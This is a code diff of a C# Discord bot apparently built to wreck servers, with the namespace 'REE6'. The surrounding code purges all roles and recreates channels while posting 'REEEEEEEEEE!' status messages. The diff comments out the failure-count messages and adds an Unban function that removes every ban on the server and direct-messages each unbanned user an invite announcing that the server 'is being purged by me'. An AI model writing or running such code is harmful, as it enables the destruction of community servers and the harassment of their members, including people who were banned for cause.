@@ -68,7 +68,7 @@ namespace REE6
             }
             // Recreate Voice Channels
             await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Creating voice channels");
-            IUserMessage voiceChannelFailsMessage = await statusChannel.SendMessageAsync("0 voice channels could not be put in a category");
+            //IUserMessage voiceChannelFailsMessage = await statusChannel.SendMessageAsync("0 voice channels could not be put in a category");
             int voiceChannelFails = 0;
             for (int i = voiceChannelNum; i > 0; i--)
             {
@@ -82,7 +82,7 @@ namespace REE6
                 catch
                 {
                     voiceChannelFails++;
-                    await voiceChannelFailsMessage.ModifyAsync(msg => msg.Content = voiceChannelFails + " voice channel(s) could not be put in a category.");
+                    //await voiceChannelFailsMessage.ModifyAsync(msg => msg.Content = voiceChannelFails + " voice channel(s) could not be put in a category.");
                 }
             }
 
@@ -106,7 +106,7 @@ namespace REE6
 
             // Purge all existing roles
             IUserMessage statusMessage = await statusChannel.SendMessageAsync("REEEEEEEEEE! Purging roles...");
-            IUserMessage roleFailsMessage = await statusChannel.SendMessageAsync("Failed to purge 0 roles");
+            //IUserMessage roleFailsMessage = await statusChannel.SendMessageAsync("Failed to purge 0 roles");
             int roleFails = 0;
             foreach (IRole role in guild.Roles)
             {
@@ -117,7 +117,7 @@ namespace REE6
                 catch
                 {
                     roleFails++;
-                    await roleFailsMessage.ModifyAsync(msg => msg.Content = "Failed to purge " + roleFails + " role(s)");
+                    //await roleFailsMessage.ModifyAsync(msg => msg.Content = "Failed to purge " + roleFails + " role(s)");
                     roleNum -= 1;
                 }
             }
@@ -140,6 +140,24 @@ namespace REE6
             terminate.AutoReset = false;
             terminate.Elapsed += new ElapsedEventHandler(delegate (object sender, ElapsedEventArgs e) { statusChannel.DeleteAsync(); });
             terminate.Start();
+        }
+
+        public static async Task Unban(IGuild guild)
+        {
+            IInviteMetadata workingInvite = null;
+            foreach (IInviteMetadata invite in await guild.GetInvitesAsync())
+            {
+                if (invite.IsRevoked || invite.MaxUses < guild.GetBansAsync().Result.Count)
+                    break;
+                workingInvite = invite;
+            }
+
+            foreach (IBan ban in await guild.GetBansAsync())
+            {
+                await guild.RemoveBanAsync(ban.User);
+                if (workingInvite != null)
+                    await ban.User.SendMessageAsync("Remember this server? Yeah it's being purged by me, go check it out!" + workingInvite.Url);
+            }
         }
     }
 }
